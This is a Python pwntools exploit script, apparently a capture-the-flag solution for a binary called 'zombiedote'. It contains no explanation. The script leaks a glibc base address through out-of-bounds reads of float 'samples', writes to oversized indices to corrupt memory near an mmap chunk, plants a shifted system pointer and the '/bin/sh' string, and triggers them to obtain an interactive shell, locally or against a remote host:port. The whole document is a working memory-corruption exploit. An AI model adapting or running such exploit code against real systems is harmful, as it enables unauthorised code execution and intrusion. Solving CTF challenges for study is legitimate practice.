#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64
from struct import pack, unpack
from typing import List

context.binary = elf = ELF('zombiedote')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def create(number: int):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Number of samples: ', str(number).encode())


def insert(samples: List[float]):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Number of samples tested: ', str(len(samples)).encode())

    for sample in samples:
        p.sendlineafter(b'(%): ', str(sample).encode())


def delete():
    p.sendlineafter(b'>> ', b'3')


def edit(number: int, sample: float):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Enter sample number: ', str(number).encode())
    p.sendlineafter(b'(%): ', str(sample).encode())


def inspect(number: int) -> float:
    p.sendlineafter(b'>> ', b'5')
    p.sendlineafter(b'Enter sample number to inspect: ', str(number).encode())
    p.recvuntil(b'(%): ')
    return float(p.recvline().decode())


def main():
    create(17000)

    glibc.address = u64(pack('d', inspect(329732))) - glibc.sym.__GI__dl_catch_error
    p.success(f'Glibc base address: {hex(glibc.address)}')

    mmap_chunk = glibc.address - 0x24ff0

    edit(17627, unpack('d', p64(mmap_chunk))[0])
    edit(17644, 0)

    insert([
        unpack('d', p64(glibc.sym.system << 17))[0],
        unpack('d', p64(next(glibc.search(b'/bin/sh'))))[0],
    ])

    delete()
    p.interactive()


if __name__ == '__main__':
    p = get_process()
    main()
